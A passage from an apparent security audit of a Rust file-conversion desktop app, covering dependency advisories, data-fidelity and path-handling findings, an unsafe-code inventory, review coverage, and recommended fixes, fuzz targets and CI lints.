EXR bytes named .png decoded OK -> \\?\C:\Users\…\photo.bmp
```

**Impact.** It enlarges the attack surface with complex decoders (EXR is large, uses `rayon` threads, and decodes floating-point data) that the project never intended to support. No crash was found; this is an exposure, not a confirmed bug.

**Fix sketch.**

```diff
-image = "0.25"
+image = { version = "0.25", default-features = false, features = ["png", "jpeg", "webp", "bmp", "gif", "tiff", "ico", "tga", "qoi", "pnm"] }
```

Then either decode with the extension's format (`ImageReader::with_format(ImageFormat::from_path(input)?)`) or reject a sniffed format that doesn't match the extension.

---

### F-11 — Dependency and build-policy gaps (Low; exploitability not established)

- **`quick-xml 0.30.0`** (RUSTSEC-2026-0194 quadratic duplicate-attribute check; RUSTSEC-2026-0195 unbounded `NsReader` namespace allocation; fixed in ≥0.41.0). It's reachable only through `zbus_xml`/`zbus-lockstep` in eframe's Linux AT-SPI stack, mainly at **proc-macro expansion** time, which reads XML from the build environment. **Not** reachable from converted files. Needs verification for runtime AT-SPI paths on Linux.
- **`unsafe-libyaml 0.2.11`** (RUSTSEC-2024-0449, unmaintained), through `serde_yaml 0.9.34+deprecated`, **does parse attacker input** (`converter.rs:192`). Miri found no UB on the sample (§3.1), but nobody will fix future bugs in it.
- Other unmaintained crates, all transitive through eframe: `paste`, `ttf-parser`, `zbus_names`, `zvariant`, `zvariant_derive`.
- **No `deny.toml`**, **no CI workflow**, and no `#![forbid(unsafe_code)]`. Nothing stops a regression or a new advisory from shipping. Positives: `Cargo.lock` is committed, all sources come from crates.io, and there's no first-party `build.rs`.

**Fix sketch.** Upgrade eframe when a release drops `zbus-lockstep 0.4` and `quick-xml 0.30`. Migrate YAML to a maintained backend after checking that crate's own RustSec record (some forks have advisories of their own). Add a `deny.toml` with a GPL-3.0-compatible license allowlist and scoped, expiring advisory ignores.

---

### Minor (Info)

- **M-1 Data fidelity (Confirmed).** These are documented in `docs/formats.md:52-73`, but data still changes silently:
  - CSV `id,x,x` / `18446744073709551615,first,second` / `00042,a,b` becomes `"id": 1.8446744073709552e+19, "x": "second"` and `"id": 42`. The duplicate header collapses, the value goes through `f64` (`converter.rs:237-243`), and the leading zeros are lost.
  - Duplicate JSON and YAML keys are last-value-wins.

  Fix: try `u64` before `f64`, keep integer lexemes out of range or with leading zeros as strings, and reject duplicate headers.
- **M-2 Verbatim `\\?\` paths shown in the UI and passed to Explorer (Confirmed path form; Explorer behaviour Needs verification).** `plan()` canonicalizes the output directory (`output.rs:89-91`), so `Status::Done` holds `\\?\C:\…` (seen in the F-10 probe output). That reaches the tooltip and `explorer /select,\\?\C:\…` (`main.rs:514-516`). Explorer handles verbatim paths and comma-containing names poorly. "Show in folder" may open the wrong location, and a stem containing `,` could be split into extra arguments. Fix: strip the verbatim prefix (for example with the `dunce` crate) and use `SHOpenFolderAndSelectItems`.
- **M-3 Swallowed import errors (Confirmed).** `if let Ok(entries)` and `.flatten()` (`main.rs:106-107`) silently drop unreadable directories and entries.
- **M-4 UI-thread filesystem work (Confirmed).** The startup `ffmpeg -version` call (`main.rs:92`), traversal (F-01), and planning all run inside `update()`. Planning means canonicalize, `create_dir_all`, handle opens, and up to 10,000 `symlink_metadata` probes per job (`output.rs:96-131`). A slow network share or a directory pre-filled with `x (1)…x (9999)` names freezes the window.
- **M-5 Identity on file systems without stable file IDs (Needs verification).** On Windows, `same_file` compares the volume serial plus the 64-bit `nFileIndex` (`same-file-1.0.6/src/win.rs:136-145`). On ReFS (128-bit IDs) or some SMB/FAT redirectors these may be zero or non-unique. Mostly this fails safe (spurious "aliases a protected source" errors or extra suffixes). It can, however, make the "destination changed" check at `output.rs:228` pass for a replaced file. Rename semantics still protect source content.
- **M-6 Source swapped after planning (Info).** Converters reopen `input` by path (`converter.rs:138, 189`, and FFmpeg). If someone with write access to the *source* directory swaps the file for a FIFO or `/dev/zero` symlink after planning, the worker blocks or reads forever. That needs a live local attacker and is out of the baseline model.

---

## 6. Unsafe inventory

| Scope | `unsafe` sites | Verdict |
|---|---|---|
| `src/main.rs` (526 lines) | 0 | n/a |
| `src/converter.rs` (618 lines) | 0 | n/a |
| `src/output.rs` (520 lines) | 0 | n/a |
| `build.rs`, proc macros, FFI | none present | n/a |

There is no first-party `extern "C"`, `repr(C)`, raw pointer, `MaybeUninit`, `transmute`, `from_raw_parts`, manual `Send`/`Sync`, or custom `Drop`. The safe-std-wrapper calls `CommandExt::creation_flags` (`converter.rs:297-299`) and `MetadataExt::file_attributes` (`output.rs:266-268`) need no unsafe. **Soundness verdict for first-party code: sound** (nothing to violate). Recommend adding `#![forbid(unsafe_code)]` to keep it that way.

Dependency unsafe code reached by attacker input was **not** verified line by line: `unsafe-libyaml` and its `serde_yaml` wrapper, the `image`/`png`/`zune-jpeg`/`exr`/`tiff`/`gif`/`image-webp` codecs, and `same-file`/`tempfile`/`winapi-util` (Win32 calls). Geiger couldn't produce counts (§3.1). Coverage is limited to the Miri samples in §3.1 and reading `same-file`'s identity logic and `tempfile`'s Windows persist path (`tempfile-3.27.0/src/file/imp/windows.rs:84-113`, which clears `FILE_ATTRIBUTE_TEMPORARY` before the move, so published outputs don't keep the temporary attribute).

---

## 7. Coverage

**Reviewed in depth (every line):** `src/output.rs`, `src/converter.rs`, `src/main.rs`, including all 20 tests; `Cargo.toml`; the lockfile advisory paths; and the README and `docs/*.md` claims about behaviour.

**Dependency code read for specific questions:**
- `same-file 1.0.6`: the Unix and Windows `Handle` implementations.
- `winapi-util 0.1.11`: `from_path_any` open flags. It uses std's default share mode (read, write, and delete), so source files stay deletable while a batch holds handles.
- `tempfile 3.27.0`: Windows create and persist.
- `image 0.25.10`: `Limits` and the default feature set.
- Rust std: Windows `resolve_exe` / `search_paths`.

**Concurrency review conclusions:**
- There is no async runtime.
- There are two mutexes: the job queue (held only for `pop`) and `ProtectedInputs.publication` (held across one commit; no nested locking, so no lock-order cycle).
- The mpsc channel is unbounded but carries at most 2 messages per job.
- There are no `Arc` cycles, and no interior mutability shared without synchronisation.

**Not reviewed or not proven:**
- The internals of 491 transitive crates, the FFmpeg codecs and demuxers beyond the five inclusion probes, and the graphics, windowing, and portal stacks.
- Linux and macOS at runtime. The F-04 `EMFILE` threshold is inferred; WSL had no Rust toolchain.
- GUI automation: the F-01 replica stands in for `App::add_path`.
- Fuzzing campaigns.
- `reveal()`'s actual Explorer behaviour (M-2): not launched, to avoid opening windows on the desktop.

---

## 8. Recommendations

### Fix order
1. F-01: background, iterative, non-link-following import with visited set and budgets.
2. F-02 / F-03: explicit image dimension and RGBA budgets, data input-size and CSV cell budgets, CSV streamed into the staged file, and a global memory/concurrency semaphore.
3. F-04 / F-06: identity keys instead of open handles; per-row planner errors.
4. F-07 / F-08: `catch_unwind`, a cancel flag, owned and killable FFmpeg children with a deadline and capped stderr, and demuxer/protocol allowlists.
5. F-10 / F-11 / F-09: trim `image` features, then add dependency policy and CI, and launch external programs by absolute path.

### Fuzz targets worth adding

The crate is bin-only, so first move `converter` and `output` into a `lib.rs` so `cargo-fuzz` can link them.

| Target | Function / call site | What to assert |
|---|---|---|
| `fuzz_json_value` | `serde_json::from_str::<Value>` (`converter.rs:191`) → every serializer (`:198-211`) | no panic; output size ≤ k·input |
| `fuzz_yaml_value` | `serde_yaml::from_str::<Value>` (`:192`) → serializers | no panic or UB (also run the corpus under Miri); expansion budget respected |
| `fuzz_toml_value` | `toml::from_str::<Value>` (`:193`) and `toml::to_string_pretty` (`:207`) | no panic; nulls produce errors, not panics |
| `fuzz_read_csv` | `read_csv` (`:217`) and `infer_scalar` (`:233`) | no panic; documented typing rules (round-trip integers exactly) |
| `fuzz_write_csv` | `write_csv` (`:252`) on arbitrary `Value` | cell and byte budget enforced before allocating |
| `fuzz_image_convert` | `ImageReader::with_guessed_format().decode()` (`:138-142`) → each target branch (`:145-171`) | under an RSS/time cap: no panic; respects F-02 limits; ICO resize bounded |
| `prop_output_planner` | `OutputPlanner::new` / `plan` / `begin` / `commit` (`output.rs`) | property tests over random names, cases, hard links, symlinks, pre-existing files, and concurrent planners: no protected input modified, no clobber when the destination was absent at planning time |
| `prop_folder_scan` | replacement for `App::add_path` | random directory graphs with links: terminates within budget, each file once |

Seed corpora with the probes from this audit: sparse JSON, the YAML alias file, the 16384² PNG, EXR-as-PNG, the junction loop, and the dangling-symlink row.

### CI and lints

- Add a CI workflow (there is none). On Windows, Linux, and macOS, run `cargo check --locked --all-targets`, `cargo test --locked` with FFmpeg installed (fail if the media tests skip), and, on Windows, a lane with Developer Mode so the symlink tests can't silently skip.
- Run `cargo audit` and `cargo deny check` with a committed `deny.toml` covering licenses (GPL-3.0-compatible allowlist), bans (duplicates as warnings), sources (crates.io only), and advisories (no blanket ignores).
- Add `#![forbid(unsafe_code)]` at the crate root.
- Add Clippy, `-D warnings` on the bin target, with `clippy::unwrap_used`, `expect_used`, `panic`, and `indexing_slicing` denied in non-test code (`#[cfg_attr(test, allow(...))]`). Keep `arithmetic_side_effects` as a warning.
- Add a scheduled Miri job for the pure parser tests, and a nightly `cargo fuzz` run for the targets above with short time budgets.
- Pin or record a minimum FFmpeg version in docs, and test the F-08 inclusion corpus against it.
